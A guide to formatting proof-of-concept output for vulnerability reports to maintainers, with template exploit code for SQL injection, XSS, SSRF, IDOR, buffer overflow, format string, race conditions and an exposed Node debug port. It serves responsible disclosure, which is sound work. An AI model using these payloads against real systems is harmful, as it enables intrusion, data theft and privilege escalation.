# PoC Format Guide by Vulnerability Class

Detailed format templates for proof-of-concept output, organized by vulnerability class.
Select the format that best communicates the issue to the maintainer.

## Web Application Vulnerabilities

### SQL Injection

**Preferred format:** Standalone Python script or curl commands

**Template structure:**
```python
#!/usr/bin/env python3
"""
SQL Injection PoC - [Target Component]
CWE-89: Improper Neutralization of Special Elements used in an SQL Command

Demonstrates: [data exfiltration / auth bypass / etc.]
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# Step 1: Send crafted input to vulnerable parameter
# The [parameter] field is concatenated into a SQL query without sanitization
payload = {"param": "' OR 1=1--"}
resp = requests.post(f"{TARGET}/endpoint", data=payload)

# Step 2: Verify injection succeeded
if "expected_indicator" in resp.text:
    print("[+] SQL injection confirmed: query logic was altered")
    print(f"    Response contained {len(resp.json())} records (expected 1)")
else:
    print("[-] Injection did not succeed — target may be patched")
```

**For time-based blind injection**, use `sleep()` payloads and measure response time
differences. Print the timing delta as evidence.

### Cross-Site Scripting (XSS)

**Preferred format:** curl command + browser reproduction steps

**Reflected XSS:**
```bash
# Inject a benign payload into the vulnerable parameter
# The value is reflected in the response without encoding
curl -s "http://localhost:8080/search?q=<img+src=x+onerror=alert(1)>" | grep -o '<img[^>]*>'
```

**Stored XSS:** Use a multi-step format — one request to store, one to retrieve and
demonstrate reflection.

**DOM-based XSS:** Provide a JavaScript snippet showing the vulnerable sink and a URL
that triggers it. Include the exact DOM API call that introduces the payload.

### Server-Side Request Forgery (SSRF)

**Preferred format:** Standalone script with out-of-band verification

```python
# Step 1: Start a listener to confirm the server makes the request
# In terminal 1: nc -lvp 8888
# Step 2: Send the SSRF payload
payload = {"url": "http://127.0.0.1:8888/ssrf-probe"}
resp = requests.post(f"{TARGET}/fetch", json=payload)
# Step 3: Check listener — if connection received, SSRF confirmed
```

For blind SSRF, use DNS-based out-of-band techniques with a controlled domain or
a webhook service.

### Authentication / Authorization Bypass

**Preferred format:** Multi-step request sequence

Document the exact sequence of requests showing:
1. Normal authenticated flow (baseline)
2. Modified flow that bypasses the check
3. Evidence of unauthorized access

Use numbered steps with curl commands or a script that performs both flows
and compares results.

### Insecure Direct Object Reference (IDOR)

**Preferred format:** curl commands showing two user contexts

```bash
# As User A (owns resource 1)
curl -H "Authorization: Bearer TOKEN_A" http://localhost:8080/api/resource/1
# Returns: User A's data (expected)

# As User B (should NOT access resource 1)
curl -H "Authorization: Bearer TOKEN_B" http://localhost:8080/api/resource/1
# Returns: User A's data (VULNERABILITY — no authorization check)
```

## Memory Corruption Vulnerabilities

### Buffer Overflow

**Preferred format:** C program or Python script generating the trigger input

**Stack-based overflow:**
```c
// Generates input that overflows the buffer in vulnerable_function()
// at source.c:42. The buffer is 64 bytes but read() accepts up to 256.
#include <stdio.h>
#include <string.h>

int main() {
    // 64 bytes fill buffer + 8 bytes saved RBP + 8 bytes canary/padding
    char payload[80];
    memset(payload, 'A', sizeof(payload));
    // Write to stdout for piping to vulnerable binary
    fwrite(payload, 1, sizeof(payload), stdout);
    return 0;
}
```

**Heap overflow/use-after-free:** Provide allocation/free sequence with commentary
on heap layout. Include GDB/LLDB commands to inspect the crash.

Include the crash output (segfault address, register state, backtrace) as evidence.

### Format String

**Preferred format:** Minimal input + expected output

```bash
# The name parameter is passed directly to printf() at handler.c:87
# without a format specifier
./vulnerable_binary "$(python3 -c "print('%x.' * 20)")"
# Expected output: leaked stack values (hex addresses)
```

## Cryptographic Vulnerabilities

**Preferred format:** Script demonstrating the mathematical/logical weakness

Focus on showing *why* the cryptographic construction fails:

- **Weak randomness:** Generate multiple tokens/keys, show predictable pattern
- **ECB mode:** Encrypt structured data, show block patterns
- **Padding oracle:** Script performing the oracle queries with timing/response analysis
- **Hash collisions:** Provide two distinct inputs producing the same hash
- **Hardcoded secrets:** Show the secret and demonstrate forgery

Always explain the cryptographic principle being violated.

## Race Conditions

**Preferred format:** Concurrent request script with timing evidence

```python
import threading
import requests

TARGET = "http://localhost:8080"
results = []

def make_request():
    resp = requests.post(f"{TARGET}/transfer", json={"amount": 100})
    results.append(resp.json())

# Fire N concurrent requests to trigger TOCTOU
threads = [threading.Thread(target=make_request) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Analyze results — if total transferred exceeds balance, race condition confirmed
total = sum(r.get("transferred", 0) for r in results)
print(f"[*] Total transferred: {total} (balance was 100)")
if total > 100:
    print("[+] Race condition confirmed — balance went negative")
```

Include the expected vs actual state as evidence.

## Logic / Business Logic Flaws

**Preferred format:** Step-by-step reproduction with explanation

Logic bugs often require narrative context. Use a numbered reproduction format:

```markdown
## Reproduction Steps

1. Create account with role "user"
2. Navigate to /admin/settings (should return 403)
3. Modify request: change `role` cookie value from "user" to "admin"
4. Resend request — server returns 200 with admin panel

## Why This Works

The server checks the role from the client-supplied cookie (line 142 in
auth_middleware.js) rather than from the server-side session. An attacker
can escalate privileges by modifying the cookie value.
```

## Configuration / Deployment Issues

**Preferred format:** Minimal config + demonstration command

```yaml
# docker-compose.yml exposes debug port to all interfaces
services:
  app:
    ports:
      - "0.0.0.0:9229:9229"  # Node.js debug port — accessible externally
```

```bash
# Connect to exposed debug port from external machine
node inspect TARGET:9229
# Result: full code execution in application context
```

## General Format Principles

Regardless of vulnerability class:

1. **Show, don't just tell.** Every PoC must produce observable evidence.
2. **Diff expected vs actual.** Clearly state what *should* happen and what *does* happen.
3. **One vulnerability per PoC.** Keep demonstrations focused. Chain demonstrations
   belong in a separate "exploit chain" document.
4. **Version-pin the target.** State the exact version, commit hash, or configuration
   that is vulnerable.
5. **Include cleanup.** If the PoC creates artifacts (files, database entries, user accounts),
   document how to clean them up.
